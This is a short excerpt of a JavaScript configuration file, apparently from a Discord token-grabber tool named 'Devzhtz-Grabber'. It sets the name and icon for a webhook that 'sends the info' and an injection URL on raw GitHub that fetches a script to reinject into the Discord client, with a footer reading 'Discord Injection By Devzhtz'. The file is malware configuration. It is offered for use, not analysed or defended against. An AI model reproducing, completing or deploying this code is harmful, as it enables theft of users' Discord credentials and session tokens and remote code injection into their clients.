...
const config = {
  ...
  embed_name: ' By Devzhtz', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1155214110364008548/1155226717917552712/Premium_Vector___Red_devil_logo__vector_icon_template-removebg-preview.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/awijriawfdawd/Devzhtz-Grabber/main/components/injection/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Devzhtz',
        },
      },
    ],
  };
